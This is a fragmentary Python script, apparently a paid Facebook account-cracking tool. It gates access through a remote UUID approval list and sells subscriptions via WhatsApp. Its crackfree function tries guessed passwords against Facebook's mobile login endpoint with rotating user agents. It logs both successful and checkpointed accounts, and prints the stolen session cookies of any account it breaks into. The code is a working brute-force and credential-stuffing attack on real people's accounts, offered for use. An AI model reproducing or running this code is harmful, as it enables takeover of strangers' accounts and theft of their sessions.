...
os.system(f'xdg-open https://www.facebook.com/groups/230673489802359/?ref=share&mibextid=1uJsJG')
time.sleep(6)
print("")
print("")
...
time.sleep(6)
os.system(f'xdg-open https://github.com/K14T-TT')
print("")
print("")
...
princp=[]
url = 'https://github.com/K14T-TT/Kibriyaaprover.txt/blob/main/file%20aprovel.txt'
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/K14T-TT/Kibriyaaprover.txt/blob/main/file%20aprovel.txt').text
        ua=open('bbnew.txt','w')
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[1;36m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗ 
║ [●]  ᴀᴜᴛʜᴏʀ        :           ★彡[ᴋɪʙʀɪᴀ ᴄʜᴏᴡᴅʜᴜʀʏ]彡★     ║ 
║ [●]  Ғαcɛвσσκ      :              ᴋɪʙʀɪᴀ ᴄʜᴏᴡᴅʜᴜʀʏ║    
║ [●]  ǤιτΗυβ        :           K14T-TT   ║   
║ [●]  ƬѲѲ˩Ƨ         :          ＰＡＩＤ      ║   
║ [●]  V̸E̸R̸S̸I̸O̸N̸       :           2.4          ║ 
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
...
def Subscraption():
    ...
    id = "-".join(uuid)
	    os.system('clear')
    print(logo)
    r1 = requests.get("https://github.com/K14T-TT/Kibriyaaprover.txt/blob/main/file%20aprovel.txt").text
    if id in r1:
        os.system('clear')
        print(logo)
    else:
        ...
        os.system('clear')
        print(logo)
        print("\033[1;39m[\033[1;32m●\033[1;39m] \033[1;32m15 Days 150 Taka \033[0;92m")
        print("\033[1;39m[\033[1;32m+\033[1;39m] \033[1;32m30 Days 300 Taka \033[0;92m")
        print("\033[1;39m[\033[1;32m●\033[1;39m]\033[1;33m ᴋɪʙʀɪᴀ TooLs Daily Update)✅ \033[0;92m")
        ...
        tks = f'https://wa.me/+8801973091651?text={message}'
...
def crackfree(idf,pwv):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r{bo}[KIBRIA -M2] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;90m[KIBRIA  -Cp] {idf} • {pw}')
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[0;92m[KIBRIA  💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;96m{kuki} ')
                print('')
